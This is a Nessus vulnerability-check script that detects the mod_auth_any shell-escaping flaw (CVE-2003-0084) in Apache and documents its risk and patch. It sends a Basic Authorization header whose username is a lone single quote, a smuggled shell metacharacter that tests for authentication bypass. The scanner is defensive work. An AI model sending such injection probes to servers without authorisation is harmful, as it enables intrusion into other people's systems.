#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
#
# See the Nessus Scripts License for details
#
# Ref:
#
# From: Mario Sergio Fujikawa Ferreira <lioux@FreeBSD.org>
# Date: Mon, 24 Mar 2003 20:23:11 -0800 (PST)
# To: ports-committers@FreeBSD.org, cvs-ports@FreeBSD.org,
#         cvs-all@FreeBSD.org
# Subject: cvs commit: ports/www/mod_auth_any Makefile ports/www/mod_auth_any/files
#         bash_single_quote_escape_string.c patch-mod_auth_any.c



if(description)
{
 script_id(11481);
 script_bugtraq_id(7448);
 script_cve_id("CVE-2003-0084");
 if ( defined_func("script_xref") ) script_xref(name:"RHSA", value:"RHSA-2003:113-01");

 script_version("$Revision: 1.9 $");
 
 name["english"] = "mod_auth_any command execution";

 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host seems to be running mod_auth_any, an Apache Module
which allows the use of third-party authentication programs.

This module does not properly escape shell characters when a
username is supplied, and therefore an attacker may use this module
to :
 - Execute arbitrary commands on the remote host
 - Bypass the authentication process completely
 
 
Solution : The freebsd team made patches, available at
http://www.freebsd.org/cgi/cvsweb.cgi/ports/www/mod_auth_any/files/

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Attempts to log into the remote web server";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2003 Renaud Deraison");
 family["english"] = "Remote file access";
 
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "no404.nasl", "http_version.nasl", "webmirror.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("www/apache");
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");

port = get_http_port(default:80);

if ( report_paranoia < 2 )
{
 banner = get_http_banner(port:port);
 if ( ! banner || "Apache" >!< banner ) exit(0);
}

pages = get_kb_list(string("www/", port, "/content/auth_required"));
if(isnull(pages)) exit(0);
pages = make_list(pages);

foreach file (pages)
{
 req = http_get(item:file, port:port);
 auth = egrep(pattern:"^Authorization", string:req);
 if(auth) req = req - auth;
 
 res = http_keepalive_send_recv(port:port, data:req);
 if(res == NULL) exit(0);
 if (debug_level > 0) display("---- mod_auth_any ----\n1st req on port ", port, "\n", res, "\n------------\n");
 
 if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 40[13] .*", string:res))
 { 
  idx = stridx(req, string("\r\n\r\n"));
  req = insstr(req, string("\r\nAuthorization: Basic Jzo=\r\n\r\n"), idx);
  
  res = http_keepalive_send_recv(port:port, data:req);
  if(res == NULL) exit(0);
  if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 .*", string:res))
  {
   if (debug_level > 0) display("---- mod_auth_any ----\n2nd req on port ", port, "\n", res, "\n------------\n");
   security_hole(port);
   exit(0);
  }
 }
}
